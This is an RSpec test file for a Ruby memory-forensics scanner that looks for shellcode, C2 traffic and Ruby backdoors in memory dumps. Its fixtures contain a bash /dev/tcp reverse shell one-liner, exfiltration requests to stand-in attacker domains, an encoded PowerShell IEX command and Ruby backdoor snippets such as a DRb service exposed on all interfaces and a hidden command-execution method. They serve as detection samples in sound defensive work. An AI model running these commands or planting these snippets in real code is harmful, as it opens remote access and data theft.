# frozen_string_literal: true
#
# RubyGuardian - IOC (Indicators of Compromise) Scanner Specs
# Tests for scanning memory dumps to identify known malicious patterns,
# C2 infrastructure, shellcode signatures, and backdoor indicators.

require 'rspec'
require 'fileutils'
require 'tmpdir'
require 'json'

$LOAD_PATH.unshift(File.expand_path('../lib', __dir__))
require 'ioc_scanner'

RSpec.describe RubyGuardian::MemoryForensics::IOCScanner do
  let(:tmp_dir) { Dir.mktmpdir('rg_ioc_test_') }
  let(:logger) do
    l = Logger.new(File::NULL)
    l.level = Logger::DEBUG
    l
  end

  after(:each) do
    FileUtils.rm_rf(tmp_dir)
  end

  def create_dump_file(content)
    path = File.join(tmp_dir, "dump_#{SecureRandom.hex(4)}.bin")
    File.binwrite(path, content)
    path
  end

  describe '#initialize' do
    it 'loads default IOC rule sets' do
      scanner = described_class.new(logger: logger)
      expect(scanner.rule_count).to be > 0
    end

    it 'accepts custom rule files' do
      rules_path = File.join(tmp_dir, 'custom_rules.json')
      rules = {
        'rules' => [
          { 'id' => 'CUSTOM-001', 'pattern' => 'malicious_pattern', 'severity' => 'high' }
        ]
      }
      File.write(rules_path, JSON.generate(rules))

      scanner = described_class.new(custom_rules: rules_path, logger: logger)
      expect(scanner.rule_count).to be > 0
    end

    it 'merges custom rules with default rules' do
      rules_path = File.join(tmp_dir, 'extra_rules.json')
      rules = {
        'rules' => [
          { 'id' => 'EXTRA-001', 'pattern' => 'extra_pattern', 'severity' => 'medium' }
        ]
      }
      File.write(rules_path, JSON.generate(rules))

      scanner = described_class.new(custom_rules: rules_path, logger: logger)
      default_scanner = described_class.new(logger: logger)
      expect(scanner.rule_count).to be > default_scanner.rule_count
    end
  end

  describe '#scan_for_shellcode' do
    it 'detects NOP sled patterns' do
      # Classic x86 NOP sled
      nop_sled = "\x90" * 100 + "\xCC" * 10
      path = create_dump_file("safe data " + nop_sled + " more safe data")

      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_shellcode(path)

      nop_findings = findings.select { |f| f[:indicator] == :nop_sled }
      expect(nop_findings).not_to be_empty
      expect(nop_findings.first[:offset]).to be_a(Integer)
    end

    it 'detects common shellcode signatures' do
      # Simulated syscall pattern (not real shellcode, just signature match)
      payload = "\x00" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x00" * 50
      path = create_dump_file(payload)

      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_shellcode(path)
      expect(findings).to be_an(Array)
    end

    it 'returns empty array for clean dumps' do
      path = create_dump_file("This is perfectly normal application data. " * 100)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_shellcode(path)
      expect(findings).to be_empty
    end

    it 'includes severity and confidence in findings' do
      nop_sled = "\x90" * 200
      path = create_dump_file(nop_sled)

      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_shellcode(path)

      unless findings.empty?
        expect(findings.first).to have_key(:severity)
        expect(findings.first).to have_key(:confidence)
        expect([:critical, :high, :medium, :low]).to include(findings.first[:severity])
      end
    end
  end

  describe '#scan_for_c2_indicators' do
    let(:dump_with_c2) do
      content = "normal log entry\n"
      content += "connecting to http://evil-c2-server.example.com:8443/beacon\n"
      content += "POST /api/exfiltrate HTTP/1.1\nHost: malware-drop.example.net\n"
      content += "more normal data\n"
      content += "base64_encoded_payload: " + Base64.encode64("malicious command") + "\n"
      content += "reverse shell: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
      content += "powershell -enc " + Base64.encode64("IEX(payload)").strip + "\n"
      content
    end

    it 'detects suspicious URLs and domains' do
      path = create_dump_file(dump_with_c2)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_c2_indicators(path)

      url_findings = findings.select { |f| f[:indicator] == :suspicious_url }
      expect(url_findings).not_to be_empty
    end

    it 'detects reverse shell patterns' do
      path = create_dump_file(dump_with_c2)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_c2_indicators(path)

      shell_findings = findings.select { |f| f[:indicator] == :reverse_shell }
      expect(shell_findings).not_to be_empty
    end

    it 'detects encoded payload patterns' do
      path = create_dump_file(dump_with_c2)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_c2_indicators(path)

      encoded_findings = findings.select { |f| f[:indicator] == :encoded_payload }
      expect(encoded_findings).not_to be_empty
    end

    it 'assigns higher severity to active C2 communication' do
      path = create_dump_file(dump_with_c2)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_c2_indicators(path)

      high_severity = findings.select { |f| [:critical, :high].include?(f[:severity]) }
      expect(high_severity).not_to be_empty
    end
  end

  describe '#scan_for_ruby_backdoors' do
    let(:dump_with_backdoors) do
      lines = [
        'ObjectSpace.each_object(Class) { |c| c.class_eval("def backdoor; end") }',
        'Kernel.module_eval { define_method(:hidden_exec) { |cmd| `#{cmd}` } }',
        'require "drb"; DRb.start_service("druby://0.0.0.0:9999")',
        'TracePoint.new(:call) { |tp| send_to_c2(tp) }.enable',
        'set_trace_func proc { |event, file, line| exfil(file, line) }',
        'normal ruby code: user.save!',
        'RubyVM::InstructionSequence.compile("malicious code").eval',
        'Fiddle::Function.new(ptr, [Fiddle::TYPE_VOIDP], Fiddle::TYPE_INT)',
      ]
      lines.join("\n")
    end

    it 'detects ObjectSpace manipulation for code injection' do
      path = create_dump_file(dump_with_backdoors)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_ruby_backdoors(path)

      objectspace_findings = findings.select { |f| f[:indicator] == :objectspace_manipulation }
      expect(objectspace_findings).not_to be_empty
    end

    it 'detects DRb service exposure' do
      path = create_dump_file(dump_with_backdoors)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_ruby_backdoors(path)

      drb_findings = findings.select { |f| f[:indicator] == :drb_exposure }
      expect(drb_findings).not_to be_empty
    end

    it 'detects TracePoint-based surveillance' do
      path = create_dump_file(dump_with_backdoors)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_ruby_backdoors(path)

      trace_findings = findings.select { |f| f[:indicator] == :tracepoint_surveillance }
      expect(trace_findings).not_to be_empty
    end

    it 'detects RubyVM instruction sequence abuse' do
      path = create_dump_file(dump_with_backdoors)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_ruby_backdoors(path)

      iseq_findings = findings.select { |f| f[:indicator] == :iseq_injection }
      expect(iseq_findings).not_to be_empty
    end

    it 'detects Fiddle/FFI usage for native code execution' do
      path = create_dump_file(dump_with_backdoors)
      scanner = described_class.new(logger: logger)
      findings = scanner.scan_for_ruby_backdoors(path)

      ffi_findings = findings.select { |f| f[:indicator] == :native_code_execution }
      expect(ffi_findings).not_to be_empty
    end
  end

  describe '#full_scan' do
    it 'runs all scan types and aggregates results' do
      content = "normal data\n" + "\x90" * 50 + "\nmore data"
      path = create_dump_file(content)

      scanner = described_class.new(logger: logger)
      report = scanner.full_scan(path)

      expect(report).to have_key(:shellcode)
      expect(report).to have_key(:c2_indicators)
      expect(report).to have_key(:ruby_backdoors)
      expect(report).to have_key(:scan_metadata)
    end

    it 'includes scan duration in metadata' do
      path = create_dump_file("test data")
      scanner = described_class.new(logger: logger)
      report = scanner.full_scan(path)

      expect(report[:scan_metadata][:duration_seconds]).to be_a(Numeric)
      expect(report[:scan_metadata][:file_size]).to be_a(Integer)
      expect(report[:scan_metadata][:rules_applied]).to be_a(Integer)
    end

    it 'provides a total finding count' do
      path = create_dump_file("clean data only")
      scanner = described_class.new(logger: logger)
      report = scanner.full_scan(path)

      expect(report[:scan_metadata][:total_findings]).to be_a(Integer)
      expect(report[:scan_metadata][:total_findings]).to be >= 0
    end
  end

  describe '#export_findings' do
    it 'exports findings as JSON' do
      path = create_dump_file("test")
      scanner = described_class.new(logger: logger)
      report = scanner.full_scan(path)

      json_path = File.join(tmp_dir, 'findings.json')
      scanner.export_findings(report, output: json_path, format: :json)

      expect(File.exist?(json_path)).to be true
      parsed = JSON.parse(File.read(json_path))
      expect(parsed).to have_key('scan_metadata')
    end

    it 'exports findings as CSV' do
      path = create_dump_file("test")
      scanner = described_class.new(logger: logger)
      report = scanner.full_scan(path)

      csv_path = File.join(tmp_dir, 'findings.csv')
      scanner.export_findings(report, output: csv_path, format: :csv)

      expect(File.exist?(csv_path)).to be true
    end
  end
end
